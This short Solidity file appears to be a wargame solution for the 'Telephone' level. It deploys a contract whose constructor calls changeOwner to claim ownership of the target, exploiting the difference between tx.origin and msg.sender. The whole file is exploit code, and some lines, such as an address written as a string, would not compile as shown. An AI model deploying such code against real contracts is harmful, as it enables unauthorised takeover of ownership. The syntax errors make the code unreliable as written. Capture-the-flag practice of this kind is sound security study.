//Requirement:
    //Claim ownership of the contract.

//Solution
    //I wrote and deployed the contract below to the contract interract withe Telephone contract

pragma solidity ^0.6.0;

contract Telephone {
  function changeOwner(address _owner);
}

contract CallTelephone {
    Telephone public instance = Telephone("instanceAddress");
    
    constructor() public {
        instance.changeOwner(msg.sender);
    }
}